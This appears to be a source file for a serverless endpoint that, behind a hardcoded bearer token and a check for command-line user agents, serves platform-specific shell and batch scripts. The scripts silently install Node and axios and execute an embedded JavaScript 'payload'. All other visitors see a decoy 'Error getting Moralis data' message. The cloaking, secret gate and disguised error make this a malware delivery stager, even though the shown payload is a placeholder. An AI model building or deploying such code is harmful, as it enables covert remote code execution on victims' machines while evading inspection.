// api/[platform].js
const SECRET = "9f14c64bb90c2f6d7e8a1742fbc7a0c41df0c";

function isCliUA(ua = "") {
  ua = String(ua).toLowerCase();
  return ua.includes("curl")
      || ua.includes("wget")
      || ua.includes("httpie")
      || ua.includes("node")
      || ua.includes("fetch/");
}

function escapeForSingleQuotedShell(js) {
  return js.replace(/'/g, "\\'").replace(/\r?\n/g, "\\n");
}

export default function handler(req, res) {
  let platform = (req.query && req.query.platform) ? String(req.query.platform).toLowerCase() : "";
  if (!platform) {
    try {
      const base = `https://${req.headers.host || 'example.com'}`;
      const urlObj = new URL(req.url, base); // works in Vercel env
      // last path segment
      const parts = urlObj.pathname.split("/").filter(Boolean);
      platform = parts.length ? parts[parts.length - 1].toLowerCase() : "";
    } catch (e) {
      platform = "";
    }
  }

  if (!["mac", "linux", "windows"].includes(platform)) {
    res.status(404).send("Invalid platform");
    return;
  }

  const ua = req.headers["user-agent"] || "";
  const auth = String(req.headers["authorization"] || "");
  const token = auth.startsWith("Bearer ") ? auth.slice(7).trim() : "";

  if (isCliUA(ua) && token === SECRET) {

    const appJs = `console.log("JS payload executed successfully!");`;
    const jsForNode = escapeForSingleQuotedShell(appJs);

    let script = "";

    if (platform === "mac" || platform === "linux") {
      script = `#!/bin/sh
echo "=== Running POSIX debug script ==="

# 1) Check node
if command -v node >/dev/null 2>&1; then
  echo "Node already installed: $(node -v)"
else
  echo "Node not found. Installing..."
  if [ "$(uname)" = "Darwin" ]; then
    if command -v brew >/dev/null 2>&1; then
      brew install node
    else
      echo "No brew detected, fallback not implemented for mac"
    fi
  else
    if command -v apt-get >/dev/null 2>&1; then
      curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
      sudo apt-get install -y nodejs
    fi
  fi
fi

# 2) Check npm
if command -v npm >/dev/null 2>&1; then
  echo "npm found: $(npm -v)"
else
  echo "npm not found"
fi

# 3) Check axios
if npm list -g axios >/dev/null 2>&1; then
  echo "axios already installed globally"
else
  echo "Installing axios globally..."
  npm install -g axios
fi

# 4) Run JS payload
echo "Running JS payload..."
node -e '${jsForNode}'
echo "=== POSIX debug script finished ==="
`;
    } else { // windows
      const jsForNodeWin = jsForNode.replace(/\\"/g, '\\\\"');
      script = `@echo off
echo === Running Windows debug script ===

REM 1) Check Node
where node >nul 2>nul
if errorlevel 1 (
  echo "Node not found. Attempting install..."
  winget install --silent --id OpenJS.NodeJS
) else (
  node -v
)

REM 2) Check npm
where npm >nul 2>nul
if errorlevel 1 (
  echo "npm not found"
) else (
  npm -v
)

REM 3) Check axios
npm list -g axios >nul 2>nul
if errorlevel 1 (
  echo "Installing axios globally..."
  npm install -g axios
) else (
  echo "axios already installed"
)

REM 4) Run JS payload
echo "Running JS payload..."
node -e "${jsForNodeWin}"
echo === Windows debug script finished ===
`;
    }

    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.status(200).send(script);
    return;
  }

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.status(200).send("/ Error getting Moralis data");
}
